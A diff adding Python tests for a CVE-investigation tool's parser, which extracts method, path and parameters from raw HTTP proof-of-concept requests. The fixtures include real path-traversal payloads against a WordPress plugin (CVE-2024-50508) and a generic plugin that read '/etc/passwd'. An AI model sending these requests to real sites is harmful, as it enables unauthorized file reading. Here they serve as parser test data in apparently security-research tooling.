@@ -7047,3 +7047,96 @@ def test_research_and_poc_prompts_require_action_value_in_endpoint():
     for prompt in (_RESEARCH_SYS, _EXTRACT_POC_SYS):
         assert "action" in prompt
         assert "NUNCA dejes 'action' como" in prompt
+
+
+def test_parse_raw_http_poc_request_extracts_real_values_including_action():
+    # bug real confirmado en vivo (CVE-2024-50508): la extraccion via LLM reducia 'parameters' a
+    # una lista de NOMBRES sin valores, perdiendo el valor REAL de 'action' (critico para que
+    # WordPress enrute la peticion a algun manejador). El PoC real traia un bloque de peticion
+    # HTTP cruda con los valores reales de TODOS los parametros -- parsearlo deterministicamente
+    # evita depender de que el LLM lo transcriba bien.
+    from binoracle.workflows.cve_agent import parse_raw_http_poc_request
+    text = (
+        "POC\n\n"
+        "POST /wp-admin/admin-ajax.php HTTP/2\n"
+        "Host: wp-dev.ddev.site\n"
+        "Content-Type: application/x-www-form-urlencoded\n"
+        "Content-Length: 53\n\n"
+        "action=pc_added_uploaded_image&file[path]=/etc/passwd\n"
+        '{\n  "path": "/var/www/html/wp-content/uploads/x.txt",\n  "status": "success"\n}\n')
+    r = parse_raw_http_poc_request(text)
+    assert r is not None
+    assert r["method"] == "POST"
+    assert r["path"] == "/wp-admin/admin-ajax.php"
+    assert r["body_params"] == {"action": "pc_added_uploaded_image", "file[path]": "/etc/passwd"}
+    assert r["headers"]["Host"] == "wp-dev.ddev.site"
+
+
+def test_parse_raw_http_poc_request_handles_get_with_no_body():
+    from binoracle.workflows.cve_agent import parse_raw_http_poc_request
+    text = "GET /wp-content/plugins/foo/ajax.php?file=../../etc/passwd HTTP/1.1\nHost: target.local\n\n"
+    r = parse_raw_http_poc_request(text)
+    assert r["method"] == "GET"
+    assert r["path"] == "/wp-content/plugins/foo/ajax.php?file=../../etc/passwd"
+    assert r["body_params"] is None
+
+
+def test_parse_raw_http_poc_request_does_not_misparse_json_body_as_form_params():
+    from binoracle.workflows.cve_agent import parse_raw_http_poc_request
+    text = 'POST /api/x HTTP/1.1\nHost: t\nContent-Type: application/json\n\n{"a": 1}\n'
+    r = parse_raw_http_poc_request(text)
+    assert r["method"] == "POST"
+    assert r["body_params"] is None   # JSON, no form-urlencoded -- no se inventa nada
+
+
+def test_parse_raw_http_poc_request_returns_none_without_a_request_block():
+    from binoracle.workflows.cve_agent import parse_raw_http_poc_request
+    assert parse_raw_http_poc_request("") is None
+    assert parse_raw_http_poc_request(None) is None
+    assert parse_raw_http_poc_request("just some prose, no http block here") is None
+    assert parse_raw_http_poc_request("import requests\nrequests.post(url, data=payload)") is None
+
+
+def test_investigate_cve_prefers_raw_poc_request_over_llm_extraction(monkeypatch):
+    # end-to-end: cuando el PoC trae un bloque de peticion cruda, su endpoint/metodo/parametros
+    # (con VALORES reales) deben ganar sobre lo que haya extraido la hipotesis del LLM o
+    # _extract_hints_from_real_poc, no solo coexistir.
+    import json as _json
+    from binoracle.workflows import cve_agent, cvelookup, websource
+
+    raw_poc_text = (
+        "POST /wp-admin/admin-ajax.php HTTP/2\n"
+        "Host: wp-dev.ddev.site\n"
+        "Content-Type: application/x-www-form-urlencoded\n\n"
+        "action=pc_added_uploaded_image&file[path]=/etc/passwd\n")
+
+    def fake_fetch_cve(cve_id, timeout=20.0, enrich=True):
+        ref = cvelookup.ExploitRef(url="https://github.com/RandomRobbieBF/CVE-2024-50508",
+                                   source="github")
+        return cvelookup.CVEInfo(
+            cve_id=cve_id, ok=True,
+            description="The Woo Product Design WordPress plugin before 1.0.1 ... Directory "
+                        "Traversal.",
+            has_public_exploit=True, exploit_refs=[ref])
+    monkeypatch.setattr(cvelookup, "fetch_cve", fake_fetch_cve)
+    monkeypatch.setattr(cve_agent, "fetch_public_poc_source", lambda refs, on_step=None: raw_poc_text)
+    monkeypatch.setattr(websource, "fetch_source",
+                        lambda *a, **kw: websource.SourceFetchResult(ok=False, note="not fetched"))
+
+    class _FakeLLM:
+        def available(self):
+            return True
+        def chat(self, messages, json_mode=True):
+            # simula una hipotesis/extraccion peor: 'action' como nombre suelto, sin su valor
+            return _json.dumps({
+                "vuln_class": "path-traversal", "endpoint": "/wp-admin/admin-ajax.php",
+                "http_method": "POST", "parameters": ["action", "file[path]"],
+            })
+
+    inv = cve_agent.investigate_cve("CVE-2024-50508", config=object(), llm=_FakeLLM(),
+                                    on_step=lambda m: None, lang="es")
+
+    assert inv.llm_notes.get("endpoint") == "/wp-admin/admin-ajax.php"
+    assert inv.llm_notes.get("http_method") == "POST"
+    assert inv.llm_notes.get("parameters") == {"action": "pc_added_uploaded_image",
+                                               "file[path]": "/etc/passwd"}
